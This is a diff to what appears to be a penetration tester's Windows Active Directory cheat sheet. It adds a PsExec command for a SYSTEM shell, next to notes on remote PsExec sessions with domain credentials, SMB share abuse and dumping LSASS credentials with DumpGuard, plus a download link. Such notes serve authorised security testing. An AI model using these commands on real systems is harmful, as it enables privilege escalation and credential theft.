@@ -62,6 +62,7 @@ Enter-PSSession {PSSession_ID_returned}
 	- `ADMIN$` share available (on by default)
 	- File and Printer sharing (on by default)
 - `./PsExec64.exe -i  \\{dnshostname} -u {domain}\{domain_user} -p {password} cmd`
+- Get SYSTEM shell: `PsExec.exe -i -s cmd.exe`
 
 **SMB**
 - Domain trusts can be abused to view internal SMB shares
@@ -202,6 +203,7 @@ Enter-PSSession {PSSession_ID_returned}
 - [DumpGuard](https://github.com/bytewreck/DumpGuard) seems to be able to dump LSASS without actually touching LSASS memory, using the Remote Credential Guard protocol
   - Compiled version here: https://khaelkugler.com/misc_scripts/DumpGuard.exe
   - Will need system, so use PsExec: https://khaelkugler.com/misc_scripts/PsExec.exe
+    - `PsExec.exe -i -s cmd.exe`
   - Usage: `DumpGuard.exe /mode:all`
     - Can add `/domain:{DOMAIN}`, `/username:{SAMACCOUNTNAME}`, `/password:{PASSWORD}`, `(/spn:{SPN})`
 
